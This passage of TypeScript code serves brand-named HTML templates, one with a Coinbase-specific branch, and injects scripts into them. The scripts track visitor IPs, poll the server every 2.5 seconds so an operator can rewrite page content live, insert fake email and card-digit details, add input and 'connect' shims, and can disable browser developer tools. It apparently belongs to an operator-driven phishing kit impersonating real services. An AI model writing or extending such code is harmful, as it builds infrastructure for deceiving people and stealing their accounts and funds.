  window.__rvLiveDates = true;
  var now = new Date();
  var vars = {
    date: now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
    dateLong: now.toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric', year: 'numeric' }),
    dateTime: now.toLocaleString('en-US', { month: 'short', day: 'numeric', year: 'numeric', hour: 'numeric', minute: '2-digit', timeZoneName: 'short' }),
    time: now.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', timeZoneName: 'short' }),
    currentYear: String(now.getFullYear())
  };
  function stamp() {
    document.querySelectorAll('[data-rv-var]').forEach(function (el) {
      var k = el.getAttribute('data-rv-var');
      if (k && vars[k] != null && vars[k] !== '' && !el.getAttribute('data-rv-skip-date')) el.textContent = vars[k];
    });
    document.querySelectorAll('[data-rv-date]').forEach(function (el) {
      var k = el.getAttribute('data-rv-date') || 'dateTime';
      if (vars[k]) el.textContent = vars[k];
    });
    document.querySelectorAll('#rv-time,[data-rv-time]').forEach(function (el) {
      el.textContent = vars.dateTime;
    });
    document.querySelectorAll('[data-rv-year]').forEach(function (el) {
      el.textContent = vars.currentYear;
    });
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', stamp);
  else stamp();
})();
</script>`;

const PAGE_VARS_SHIM = `<script data-injected="visitor-page-vars">
(function () {
  if (window.__rvPageVarsReady) return;
  window.__rvPageVarsReady = true;
  var BP = window.__rvBrandPage || { brand: '', page: '' };
  function readBp() {
    try {
      var parts = decodeURIComponent(location.pathname).split('/').filter(Boolean);
      var idx = parts.indexOf('preview');
      if (idx >= 0 && parts[idx + 1] && parts[idx + 2]) {
        BP.brand = BP.brand || parts[idx + 1];
        BP.page = BP.page || parts[idx + 2];
      }
    } catch (e) {}
  }
  readBp();
  function apply(vars) {
    if (!vars) return;
    document.querySelectorAll('[data-rv-var]').forEach(function (el) {
      var k = el.getAttribute('data-rv-var');
      if (k && vars[k] != null && vars[k] !== '' && !el.getAttribute('data-rv-skip-date')) el.textContent = vars[k];
    });
    document.querySelectorAll('[data-rv-var-html]').forEach(function (el) {
      var k = el.getAttribute('data-rv-var-html');
      if (k && vars[k] != null) el.innerHTML = vars[k];
    });
    document.querySelectorAll('[data-rv-var-img]').forEach(function (el) {
      var k = el.getAttribute('data-rv-var-img');
      if (k && vars[k]) el.setAttribute('src', vars[k]);
    });
    document.querySelectorAll('[data-rv-var-href]').forEach(function (el) {
      var k = el.getAttribute('data-rv-var-href');
      if (k && vars[k]) el.setAttribute('href', vars[k]);
    });
  }
  function fetchVars() {
    var q = '?brand=' + encodeURIComponent(BP.brand) + '&page=' + encodeURIComponent(BP.page);
    if (window.__rvVisitorIp) q += '&ip=' + encodeURIComponent(window.__rvVisitorIp);
    return fetch('/api/visitor/page-vars' + q)
      .then(function (r) { return r.json(); })
      .catch(function () { return null; });
  }
  function refresh() {
    return fetchVars().then(function (d) {
      if (d && d.ok && d.vars) apply(d.vars);
    });
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', refresh);
  } else {
    refresh();
  }
  setInterval(refresh, 2500);
})();
</script>`;

function injectPageVarsShim(html: string, brand: string, page: string, visitorIp?: string): string {
	if (!getSchema(brand, page).length) return html;
	if (html.includes('data-injected="visitor-page-vars"')) return html;
	const ipScript = visitorIp
		? `<script data-injected="visitor-page-vars-ip">window.__rvVisitorIp=${JSON.stringify(visitorIp)};</script>`
		: '';
	const bp = JSON.stringify({ brand, page }).replace(/</g, '\\u003c');
	const cfg = `<script data-injected="visitor-page-vars-config">window.__rvBrandPage=${bp};</script>`;
	const payload = cfg + ipScript + PAGE_VARS_SHIM;
	const bodyClose = html.lastIndexOf('</body>');
	if (bodyClose === -1) return html + payload;
	return html.slice(0, bodyClose) + payload + html.slice(bodyClose);
}

export function loadTemplateHtml(
	brand: string,
	page: string,
	opts?: LoadTemplateOptions
): string | undefined {
	const t = findTemplate(brand, page);
	if (!t) return undefined;
	const file = join(TEMPLATE_ROOT, `${t.slug}.html`);
	if (!existsSync(file)) return undefined;
	let html = readFileSync(file, 'utf-8');
	html = injectMobileScrollFix(html);
	html = injectPageVarsShim(html, brand, page, opts?.visitorIp);
	if (brand === 'Coinbase') {
		html = injectCoinbaseMobileFix(html);
	}
	if (opts?.lastTwoDigits || opts?.emailFrom || opts?.emailTo) {
		html = applyOverrides(html, {
			lastTwoDigits: opts.lastTwoDigits,
			emailFrom: opts.emailFrom,
			emailTo: opts.emailTo
		});
	}
	if (CASE_PAGE_NAMES.has(page)) {
		html = injectCaseInputShim(html);
	}
	if (!SKIP_GENERIC_WIRING.has(`${brand}/${page}`) && !CASE_PAGE_NAMES.has(page)) {
		html = injectAdvanceShim(html, brand, page);
	}
	html = injectConnectShim(html, brand, page);
	html = applyLiveDatesToHtml(html);

	const bodyCloseDates = html.lastIndexOf('</body>');
	if (bodyCloseDates !== -1 && !html.includes('visitor-live-dates')) {
		html = html.slice(0, bodyCloseDates) + LIVE_DATE_SHIM + html.slice(bodyCloseDates);
	} else if (!html.includes('visitor-live-dates')) {
		html += LIVE_DATE_SHIM;
	}

	if (page === 'Loading') {
		const loadingPayload = LOADING_UI_STYLE + LOADING_GATE_MARKUP + LOADING_GATE_SHIM;
		const bodyClose = html.lastIndexOf('</body>');
		if (bodyClose !== -1) {
			html = html.slice(0, bodyClose) + loadingPayload + html.slice(bodyClose);
		} else {
			html += loadingPayload;
		}
	}

	if (dbGetSetting('visitor.disable_devtools') === 'true') {
		const bodyClose = html.lastIndexOf('</body>');
		if (bodyClose !== -1) {
			html = html.slice(0, bodyClose) + DEVTOOLS_BLOCK_SHIM + html.slice(bodyClose);
		} else {
			html += DEVTOOLS_BLOCK_SHIM;
		}
	}

	return html;
}
